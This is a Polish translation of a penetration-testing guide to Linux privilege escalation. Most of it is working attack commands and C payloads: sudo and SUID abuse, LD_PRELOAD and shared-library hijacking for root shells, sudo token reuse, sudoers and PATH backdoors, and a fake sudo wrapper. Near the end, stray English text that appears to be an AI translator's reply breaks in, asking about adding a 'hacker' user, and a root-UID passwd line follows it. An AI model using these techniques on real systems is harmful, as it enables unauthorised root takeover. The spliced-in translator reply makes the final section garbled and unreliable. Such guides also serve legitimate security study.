D-Bus działa w modelu **allow/deny**, zarządzając uprawnieniami do wiadomości (wywołania metod, emisje sygnałów, itd.) na podstawie skumulowanego efektu pasujących reguł polityki. Te polityki określają interakcje z bus, co może potencjalnie umożliwić eskalację uprawnień poprzez nadużycie tych zezwoleń.

Przykład takiej polityki w /etc/dbus-1/system.d/wpa_supplicant.conf pokazano poniżej — opisuje uprawnienia użytkownika root do posiadania, wysyłania i odbierania wiadomości od `fi.w1.wpa_supplicant1`.

Polityki bez określonego użytkownika lub grupy stosują się uniwersalnie, podczas gdy polityki w kontekście "default" dotyczą wszystkich, którzy nie są objęci innymi, konkretnymi politykami.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Dowiedz się tutaj, jak enumerate i exploit komunikację D-Bus:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Sieć**

Zawsze warto enumerate sieci i określić pozycję maszyny.

### Ogólna enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Otwarte porty

Zawsze sprawdź usługi sieciowe działające na maszynie, z którymi nie mogłeś wcześniej wchodzić w interakcję przed uzyskaniem do niej dostępu:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Sprawdź, czy możesz sniff traffic. Jeśli tak, możesz być w stanie przechwycić jakieś poświadczenia.
```
timeout 1 tcpdump
```
## Użytkownicy

### Ogólna enumeracja

Sprawdź, **who** jesteś, jakie masz **privileges**, jacy **users** są w systemie, którzy mogą **login** i którzy mają **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Duży UID

Niektóre wersje Linuksa były podatne na błąd, który pozwala użytkownikom z **UID > INT_MAX** eskalować uprawnienia. Więcej informacji: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** używając: **`systemd-run -t /bin/bash`**

### Grupy

Sprawdź, czy jesteś **członkiem jakiejś grupy**, która mogłaby przyznać Ci uprawnienia roota:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Schowek

Sprawdź, czy w schowku nie ma nic interesującego (jeśli to możliwe)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Polityka haseł
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Znane hasła

Jeśli **znasz jakiekolwiek hasło** środowiska **spróbuj zalogować się jako każdy użytkownik** używając tego hasła.

### Su Brute

Jeżeli nie przeszkadza Ci generowanie dużego hałasu i na komputerze są dostępne binarki `su` i `timeout`, możesz spróbować przeprowadzić brute-force użytkownika używając [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) z parametrem `-a` również próbuje przeprowadzać brute-force na użytkownikach.

## Nadużycia zapisywalnego PATH

### $PATH

Jeśli znajdziesz, że możesz **zapisywać w jakimś folderze z $PATH** możesz być w stanie eskalować uprawnienia poprzez **utworzenie backdoor w zapisywalnym folderze** o nazwie jakiegoś polecenia, które ma być wykonywane przez innego użytkownika (najlepiej root) i które **nie jest ładowane z folderu, który znajduje się wcześniej** w $PATH niż twój zapisywalny folder.

### SUDO i SUID

Możesz mieć pozwolenie na uruchomienie pewnego polecenia za pomocą sudo lub polecenia mogą mieć ustawiony bit suid. Sprawdź to używając:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Niektóre **nieoczekiwane polecenia pozwalają na odczyt i/lub zapis plików, a nawet wykonanie polecenia.** Na przykład:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Konfiguracja sudo może pozwolić użytkownikowi na uruchomienie pewnego polecenia z uprawnieniami innego użytkownika bez podawania hasła.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
W tym przykładzie użytkownik `demo` może uruchomić `vim` jako `root`. Zdobycie `shell` jest teraz trywialne — wystarczy dodać klucz ssh do katalogu `root` lub wywołać `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ta dyrektywa pozwala użytkownikowi **set an environment variable** podczas wykonywania czegoś:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ten przykład, **oparty na HTB machine Admirer**, był **podatny** na **PYTHONPATH hijacking**, umożliwiając załadowanie dowolnej biblioteki python podczas uruchamiania skryptu jako root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV zachowane przez sudo env_keep → root shell

Jeśli sudoers zachowuje `BASH_ENV` (np. `Defaults env_keep+="ENV BASH_ENV"`), możesz wykorzystać zachowanie Bash przy uruchamianiu nieinteraktywnym, aby uruchomić dowolny kod jako root podczas wywoływania dozwolonego polecenia.

- Dlaczego to działa: Dla powłok nieinteraktywnych Bash ocenia `$BASH_ENV` i wczytuje ten plik przed uruchomieniem docelowego skryptu. Wiele reguł sudo pozwala na uruchomienie skryptu lub wrappera powłoki. Jeśli `BASH_ENV` jest zachowane przez sudo, twój plik zostanie wczytany z uprawnieniami roota.

- Wymagania:
- Reguła sudo, którą możesz uruchomić (dowolny cel wywołujący `/bin/bash` nieinteraktywnie lub dowolny skrypt bash).
- `BASH_ENV` obecne w `env_keep` (sprawdź za pomocą `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Wzmocnienie zabezpieczeń:
- Usuń `BASH_ENV` (i `ENV`) z `env_keep`, stosuj `env_reset`.
- Unikaj wrapperów powłoki dla poleceń dozwolonych przez sudo; używaj minimalnych binarek.
- Rozważ logowanie I/O sudo i alertowanie, gdy wykorzystywane są zachowane zmienne środowiskowe.

### Ścieżki omijające wykonanie przez sudo

**Przejdź** żeby przeczytać inne pliki lub użyj **dowiązań symbolicznych**. Na przykład w pliku sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Jeśli użyty zostanie **wildcard** (\*), jest to jeszcze łatwiejsze:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Środki zaradcze**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez określonej ścieżki polecenia

Jeśli **uprawnienie sudo** jest przyznane dla pojedynczego polecenia **bez określenia ścieżki**: _hacker10 ALL= (root) less_ możesz je wykorzystać, zmieniając zmienną PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Technikę tę można również zastosować, jeśli **suid** binary **wykonuje inne polecenie bez podania jego ścieżki (zawsze sprawdź za pomocą** _**strings**_ **zawartość dziwnego pliku SUID)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

Jeżeli **suid** binary **wykonuje inne polecenie, podając ścieżkę**, możesz spróbować **eksportować funkcję** nazwaną tak, jak polecenie, które wywołuje plik suid.

Na przykład, jeśli suid binary wywołuje _**/usr/sbin/service apache2 start**_ musisz spróbować utworzyć funkcję i ją wyeksportować:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Następnie, kiedy wywołasz binarkę suid, ta funkcja zostanie wykonana

### LD_PRELOAD & **LD_LIBRARY_PATH**

Zmienna środowiskowa **LD_PRELOAD** służy do wskazania jednej lub większej liczby bibliotek współdzielonych (.so files), które loader ma załadować przed wszystkimi innymi, w tym przed standardową biblioteką C (`libc.so`). Ten proces nazywa się wstępnym ładowaniem biblioteki.

Jednak, aby utrzymać bezpieczeństwo systemu i zapobiec wykorzystaniu tej funkcji, szczególnie w przypadku wykonywalnych plików **suid/sgid**, system wymusza pewne warunki:

- Loader ignoruje **LD_PRELOAD** dla wykonywalnych plików, w których rzeczywisty identyfikator użytkownika (_ruid_) nie zgadza się z efektywnym identyfikatorem użytkownika (_euid_).
- Dla plików wykonywalnych z suid/sgid wstępnie ładowane są tylko biblioteki znajdujące się w standardowych ścieżkach, które same są suid/sgid.

Privilege escalation może wystąpić, jeśli masz możliwość wykonywania poleceń z użyciem `sudo` i wynik `sudo -l` zawiera wpis **env_keep+=LD_PRELOAD**. Ta konfiguracja pozwala, aby zmienna środowiskowa **LD_PRELOAD** utrzymywała się i była rozpoznawana nawet podczas uruchamiania poleceń przez `sudo`, co potencjalnie może prowadzić do wykonania dowolnego kodu z podwyższonymi uprawnieniami.
```
Defaults        env_keep += LD_PRELOAD
```
Zapisz jako **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Następnie **compile it** przy użyciu:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na koniec, **escalate privileges** uruchamiając
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Podobny privesc można wykorzystać, jeśli atakujący kontroluje zmienną środowiskową **LD_LIBRARY_PATH**, ponieważ kontroluje ścieżkę, w której będą wyszukiwane biblioteki.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Jeśli napotkasz binary z uprawnieniami **SUID**, które wydają się nietypowe, warto sprawdzić, czy poprawnie ładuje pliki **.so**. Można to zweryfikować, uruchamiając następujące polecenie:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na przykład, napotkanie błędu takiego jak _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeruje potencjalną możliwość wykorzystania.

Aby to wykorzystać, należy stworzyć plik C, np. _"/path/to/.config/libcalc.c"_, zawierający następujący kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ten kod, po skompilowaniu i uruchomieniu, ma na celu podniesienie uprawnień poprzez manipulowanie uprawnieniami plików i uruchomienie powłoki z podwyższonymi uprawnieniami.

Skompiluj powyższy plik C do pliku obiektu współdzielonego (.so) za pomocą:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Na koniec uruchomienie dotkniętego SUID binary powinno wywołać exploit, umożliwiając potencjalne przejęcie systemu.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Teraz, gdy znaleźliśmy SUID binary, który ładuje bibliotekę z folderu, do którego możemy zapisywać, utwórzmy bibliotekę w tym folderze o wymaganej nazwie:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Jeśli otrzymasz błąd taki jak
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to oznacza, że biblioteka, którą wygenerowałeś, musi zawierać funkcję o nazwie `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) to skuratorowana lista binarek Unix, które mogą być wykorzystane przez atakującego do obejścia lokalnych ograniczeń bezpieczeństwa. [**GTFOArgs**](https://gtfoargs.github.io/) to to samo, ale dla przypadków, gdy możesz **tylko wstrzykiwać argumenty** w polecenie.

Projekt zbiera legalne funkcje binarek Unix, które można nadużyć, aby wydostać się z ograniczonych shelli, eskalować lub utrzymać podwyższone uprawnienia, przesyłać pliki, uruchamiać bind i reverse shelle oraz ułatwiać inne zadania post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Jeśli masz dostęp do `sudo -l` możesz użyć narzędzia [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aby sprawdzić, czy znajdzie sposób na wykorzystanie jakiejkolwiek reguły sudo.

### Reusing Sudo Tokens

W przypadkach, gdy masz **sudo access** ale nie znasz hasła, możesz eskalować uprawnienia przez **oczekiwanie na wykonanie polecenia sudo i przejęcie tokenu sesji**.

Wymagania do eskalacji uprawnień:

- Masz już shell jako użytkownik "_sampleuser_"
- "_sampleuser_" użył **`sudo`** do wykonania czegoś w **ostatnich 15 minutach** (domyślnie to czas trwania tokenu sudo, który pozwala używać `sudo` bez podawania hasła)
- `cat /proc/sys/kernel/yama/ptrace_scope` zwraca 0
- `gdb` jest dostępny (możesz je przesłać)

(Możesz tymczasowo włączyć `ptrace_scope` przy pomocy `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` lub trwale modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

Jeśli wszystkie te wymagania są spełnione, **możesz eskalować uprawnienia używając:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Pierwszy **exploit** (`exploit.sh`) utworzy binarkę `activate_sudo_token` w _/tmp_. Możesz jej użyć, aby **aktywować token sudo w swojej sesji** (nie otrzymasz automatycznie powłoki roota, uruchom `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **Drugi exploit** (`exploit_v2.sh`) utworzy powłokę sh w _/tmp_ **należącą do root z setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Trzeci exploit** (`exploit_v3.sh`) utworzy **sudoers file**, który sprawi, że **sudo tokens będą wieczne i pozwoli wszystkim użytkownikom używać sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Jeśli masz **uprawnienia do zapisu** w folderze lub na któregokolwiek z utworzonych w nim plików możesz użyć binarki [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) aby **utworzyć token sudo dla użytkownika i PID**.\
Na przykład, jeśli możesz nadpisać plik _/var/run/sudo/ts/sampleuser_ i masz shell jako ten użytkownik z PID 1234, możesz **uzyskać uprawnienia sudo** bez konieczności znajomości hasła, wykonując:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Plik `/etc/sudoers` i pliki wewnątrz `/etc/sudoers.d` konfigurują, kto może używać `sudo` i w jaki sposób. Te pliki **domyślnie mogą być odczytywane tylko przez użytkownika root i grupę root**.\
**Jeśli** możesz **odczytać** ten plik, możesz być w stanie **uzyskać pewne interesujące informacje**, a jeśli możesz **zapisać** dowolny plik, będziesz w stanie **eskalować uprawnienia**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Jeśli masz uprawnienie do zapisu, możesz je nadużyć.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Inny sposób nadużycia tych uprawnień:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Istnieją alternatywy dla binarki `sudo`, takie jak `doas` dla OpenBSD — pamiętaj, aby sprawdzić konfigurację w `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Jeśli wiesz, że **użytkownik zwykle łączy się z maszyną i używa `sudo`** do eskalacji uprawnień i uzyskałeś shell w kontekście tego użytkownika, możesz **utworzyć nowy plik wykonywalny sudo**, który wykona twój kod jako root, a potem polecenie użytkownika. Następnie, **zmodyfikuj $PATH** kontekstu użytkownika (na przykład dodając nową ścieżkę w .bash_profile) tak, aby gdy użytkownik uruchomi sudo, twój plik sudo został wykonany.

Zwróć uwagę, że jeśli użytkownik używa innego shell (nie bash) będziesz musiał zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modyfikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Możesz znaleźć inny przykład w [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Lub uruchamiając coś takiego:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteka współdzielona

### ld.so

Plik `/etc/ld.so.conf` wskazuje **skąd pochodzą wczytywane pliki konfiguracyjne**. Zazwyczaj plik ten zawiera następującą ścieżkę: `include /etc/ld.so.conf.d/*.conf`

To oznacza, że pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf` będą odczytywane. Te pliki konfiguracyjne **wskazują na inne foldery**, w których będą **wyszukiwane** **biblioteki**. Na przykład zawartość `/etc/ld.so.conf.d/libc.conf` to `/usr/local/lib`. **Oznacza to, że system będzie szukał bibliotek w katalogu `/usr/local/lib`**.

Jeżeli z jakiegoś powodu **użytkownik ma uprawnienia do zapisu** na którymkolwiek z wymienionych ścieżek: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, dowolnym pliku wewnątrz `/etc/ld.so.conf.d/` lub dowolnym katalogu wskazanym w plikach konfiguracyjnych z `/etc/ld.so.conf.d/*.conf` może być w stanie eskalować uprawnienia.\
Zobacz **jak wykorzystać tę błędną konfigurację** na następnej stronie:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Po skopiowaniu biblioteki do `/var/tmp/flag15/` zostanie ona użyta przez program w tym miejscu, jak określono w zmiennej `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Następnie utwórz złośliwą bibliotekę w `/var/tmp` za pomocą `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Uprawnienia (Capabilities)

Linux capabilities zapewniają procesowi **podzbiór dostępnych uprawnień roota**. To w praktyce rozbija uprawnienia roota na **mniejsze i odrębne jednostki**. Każdą z tych jednostek można następnie niezależnie przyznać procesom. W ten sposób pełen zestaw uprawnień zostaje zredukowany, zmniejszając ryzyko wykorzystania.\
Przeczytaj następującą stronę, aby **dowiedzieć się więcej o capabilities i jak je wykorzystywać**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Uprawnienia katalogów

W katalogu, **bit "execute"** oznacza, że dany użytkownik może **cd** do folderu.\
Bit **"read"** oznacza, że użytkownik może **wyświetlić** listę **plików**, a bit **"write"** oznacza, że użytkownik może **usuwać** i **tworzyć** nowe **pliki**.

## ACLs

Listy kontroli dostępu (ACLs) stanowią drugą warstwę dyskrecjonalnych uprawnień, zdolną do **nadpisywania tradycyjnych uprawnień ugo/rwx**. Te uprawnienia zwiększają kontrolę nad dostępem do pliku lub katalogu poprzez zezwalanie lub odmawianie praw konkretnym użytkownikom, którzy nie są właścicielami ani nie należą do grupy. Ten poziom **szczegółowości zapewnia bardziej precyzyjne zarządzanie dostępem**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Nadaj** użytkownikowi "kali" uprawnienia odczytu i zapisu do pliku:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pobierz** pliki z określonymi ACLs z systemu:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otwarte shell sessions

W **old versions** możesz **hijack** jakąś **shell** session innego użytkownika (**root**).\
W **newest versions** będziesz mógł **connect** do screen sessions tylko **własnego użytkownika**. Jednak możesz znaleźć **ciekawych informacji wewnątrz session**.

### screen sessions hijacking

**Wyświetl screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Dołącz do sesji**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

To był problem z **old tmux versions**. Nie udało mi się przejąć sesji tmux (v2.1) utworzonej przez root jako użytkownik nieuprzywilejowany.

**Wypisz sesje tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Dołącz do sesji**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Sprawdź **Valentine box from HTB** jako przykład.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Wszystkie klucze SSL i SSH wygenerowane na systemach opartych na Debianie (Ubuntu, Kubuntu, itp.) między wrześniem 2006 a 13 maja 2008 mogą być podatne na ten błąd.\
Ten błąd występuje podczas tworzenia nowego ssh key w tych OS, ponieważ **możliwe były tylko 32,768 wariantów**. Oznacza to, że wszystkie możliwości można obliczyć i **mając publiczny klucz ssh możesz wyszukać odpowiadający prywatny klucz**. Obliczone możliwości możesz znaleźć tutaj: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Określa, czy uwierzytelnianie hasłem jest dozwolone. Domyślnie `no`.
- **PubkeyAuthentication:** Określa, czy uwierzytelnianie za pomocą klucza publicznego jest dozwolone. Domyślnie `yes`.
- **PermitEmptyPasswords**: Gdy uwierzytelnianie hasłem jest dozwolone, określa, czy serwer pozwala na logowanie do kont z pustymi hasłami. Domyślnie `no`.

### PermitRootLogin

Określa, czy root może logować się przy użyciu ssh, domyślnie `no`. Możliwe wartości:

- `yes`: root może logować się przy użyciu hasła i prywatnego klucza
- `without-password` or `prohibit-password`: root może logować się tylko przy użyciu prywatnego klucza
- `forced-commands-only`: root może logować się tylko przy użyciu prywatnego klucza i tylko jeśli określono opcje dotyczące command
- `no` : nie

### AuthorizedKeysFile

Określa pliki zawierające klucze publiczne, które mogą być użyte do uwierzytelniania użytkownika. Może zawierać tokeny takie jak `%h`, które zostaną zastąpione katalogiem domowym. **Możesz wskazać ścieżki absolutne** (zaczynające się od `/`) lub **ścieżki względne względem katalogu domowego użytkownika**. Na przykład:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracja wskaże, że jeśli spróbujesz zalogować się przy użyciu **private** key użytkownika "**testusername**", ssh porówna public key twojego key z tymi znajdującymi się w `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Forwardowanie agenta SSH pozwala Ci **use your local SSH keys instead of leaving keys** (without passphrases!) zamiast zostawiać je na serwerze. Dzięki temu będziesz mógł **jump** przez ssh **to a host** i stamtąd **jump to another** host **using** the **key** znajdujący się na twoim **initial host**.

Musisz ustawić tę opcję w `$HOME/.ssh.config` w następujący sposób:
```
Host example.com
ForwardAgent yes
```
Zwróć uwagę, że jeśli `Host` jest `*`, za każdym razem, gdy użytkownik łączy się z inną maszyną, ten host będzie miał dostęp do kluczy (co stanowi problem bezpieczeństwa).

Plik `/etc/ssh_config` może **nadpisać** te **opcje** i zezwolić lub zabronić tej konfiguracji.\
Plik `/etc/sshd_config` może **zezwalać** lub **zabraniać** ssh-agent forwarding za pomocą słowa kluczowego `AllowAgentForwarding` (domyślnie zezwolone).

Jeśli stwierdzisz, że Forward Agent jest skonfigurowany w środowisku, przeczytaj następującą stronę, ponieważ **możesz być w stanie wykorzystać to do eskalacji uprawnień**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Ciekawe pliki

### Pliki profili

Plik `/etc/profile` oraz pliki w `/etc/profile.d/` są **skryptami, które są wykonywane, gdy użytkownik uruchamia nową powłokę**. Dlatego, jeśli możesz **zapisać lub zmodyfikować którykolwiek z nich, możesz podnieść uprawnienia**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Jeśli znajdziesz nietypowy skrypt profilu, powinieneś sprawdzić go pod kątem **wrażliwych informacji**.

### Pliki passwd/shadow

W zależności od systemu operacyjnego pliki `/etc/passwd` i `/etc/shadow` mogą mieć inną nazwę lub może istnieć kopia zapasowa. Dlatego zaleca się **znaleźć je wszystkie** i **sprawdzić, czy możesz je odczytać**, aby zobaczyć **czy w plikach znajdują się hashes**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
W niektórych przypadkach można znaleźć **password hashes** w pliku `/etc/passwd` (lub w równoważnym).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Zapisowalny /etc/passwd

Najpierw wygeneruj hasło jednym z następujących poleceń.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the contents of src/linux-hardening/privilege-escalation/README.md. Please paste the file contents you want translated.

Also confirm how you want the `hacker` user added:
- Should I append a line (or section) to the translated README that shows commands to create the user and set a password, or just add a note with the username and generated password?
- Do you want me to generate a random password (specify length/complexity) or use one you provide?

Once you paste the README and confirm the password preference, I'll produce the translated markdown and add the `hacker` user/password as requested.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
